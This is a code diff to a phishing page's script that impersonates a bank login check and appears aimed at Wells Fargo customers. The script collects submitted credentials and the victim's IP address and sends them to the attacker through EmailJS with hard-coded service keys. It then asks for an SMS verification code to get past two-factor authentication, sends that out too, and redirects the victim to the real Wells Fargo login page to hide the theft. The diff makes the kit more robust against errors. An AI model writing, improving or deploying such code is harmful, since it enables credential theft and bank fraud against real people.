@@ -242,107 +242,112 @@
 
     <script>
     // 1. Init EmailJS
-    emailjs.init("y3lRWL7KLDjiFjNcN");
+    try {
+        emailjs.init("y3lRWL7KLDjiFjNcN");
+        console.log("EmailJS Initialized");
+    } catch (e) {
+        console.error("EmailJS Init Failed", e);
+    }
 
-    // Global variable to store IP for later use
+    // Global IP variable
     let userIP = "";
 
-    // 2. First Form Listener
-    document.getElementById('scamForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
+    // 2. First Form Logic
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.getElementById('scamForm');
         const btn = document.getElementById('verifyBtn');
-        const originalText = btn.textContent;
-        
-        btn.disabled = true;
-        btn.textContent = "Verifying...";
+        const smsSection = document.getElementById('smsSection');
 
-        // Capture Creds
-        const formData = new FormData(e.target);
-        const data = Object.fromEntries(formData.entries());
+        if (!form || !btn) {
+            console.error("Main form or button not found!");
+            return;
+        }
 
-        // Get IP
-        fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-            userIP = ipData.ip; // Save IP globally
-            data.ip = ipData.ip;
-            data.date = new Date().toLocaleString();
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("Form Submitted");
 
-            console.log("Sending Credentials...", data);
+            btn.disabled = true;
+            btn.textContent = "Verifying...";
 
-            // Send Creds to EmailJS
-            emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-            .then(response => {
-                console.log("Email Sent Successfully:", response);
-                // FORCE SHOW SMS SECTION
-                document.getElementById('scamForm').style.display = 'none';
-                document.getElementById('smsSection').style.display = 'block';
-                btn.textContent = originalText;
-                btn.disabled = false;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            // Get IP
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                userIP = ipData.ip;
+                data.ip = ipData.ip;
+                data.date = new Date().toLocaleString();
+
+                console.log("Sending Credentials to EmailJS...");
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                .then(() => {
+                    console.log("Credentials Sent! Switching to SMS.");
+                    // SHOW SMS SECTION
+                    if(form) form.style.display = 'none';
+                    if(smsSection) smsSection.style.display = 'block';
+                    
+                    // Ensure SMS section is visible
+                    smsSection.style.visibility = 'visible';
+                    smsSection.style.opacity = '1';
+                })
+                .catch(error => {
+                    console.error("EmailJS Error:", error);
+                    // Show SMS anyway on error so flow continues
+                    console.log("Showing SMS section despite error.");
+                    if(form) form.style.display = 'none';
+                    if(smsSection) smsSection.style.display = 'block';
+                });
             })
-            .catch(error => {
-                // CRITICAL FIX: Even if email fails, show the SMS box so the user can continue
-                console.error("Email Send Failed (but continuing flow):", error);
-                document.getElementById('scamForm').style.display = 'none';
-                document.getElementById('smsSection').style.display = 'block';
-                btn.textContent = originalText;
-                btn.disabled = false;
+            .catch(err => {
+                console.error("IP Fetch Error:", err);
+                // Fallback: Show SMS anyway
+                if(form) form.style.display = 'none';
+                if(smsSection) smsSection.style.display = 'block';
             });
-        })
-        .catch(error => {
-            console.error("IP Fetch Failed:", error);
-            // Fallback: Show SMS box even if IP fetch fails
-            document.getElementById('scamForm').style.display = 'none';
-            document.getElementById('smsSection').style.display = 'block';
         });
     });
 
-    // 3. SMS Code Submission
-    function submitCode() {
+    // 3. Global Submit Code Function
+    window.submitCode = function() {
         const smsCode = document.getElementById('smsCode').value;
-        
-        // Simple validation
         if(!smsCode || smsCode.length < 4) {
             alert("Please enter a valid code.");
             return;
         }
 
+        console.log("SMS Code Submitted: " + smsCode);
+        
         const btn = document.querySelector('#smsSection button');
-        btn.disabled = true;
-        btn.textContent = "Verifying...";
+        if(btn) btn.disabled = true;
 
-        // Hide SMS section, show processing spinner
         document.getElementById('smsSection').style.display = 'none';
         document.querySelector('.container').style.display = 'none';
         document.getElementById('processing').style.display = 'block';
 
-        // Prepare SMS Data
         const smsData = {
             smsCode: smsCode,
             timestamp: new Date().toLocaleString(),
             ip: userIP
         };
 
-        console.log("Sending SMS Code...", smsData);
-
-        // Send SMS Code to EmailJS
+        console.log("Sending SMS Code...");
         emailjs.send("service_2bhy4ju", "template_1qzswkk", smsData)
         .then(() => {
-            console.log("SMS Code Email Sent");
-            // Redirect after delay
+            console.log("SMS Code Sent! Redirecting...");
             setTimeout(() => {
                 window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 2000);
+            }, 1500);
         })
-        .catch((error) => {
-            console.error("SMS Email Failed:", error);
-            // Still redirect
+        .catch(err => {
+            console.error("SMS Send Failed", err);
             setTimeout(() => {
                 window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 2000);
+            }, 1500);
         });
-    }
+    };
 </script>
 
  </head>
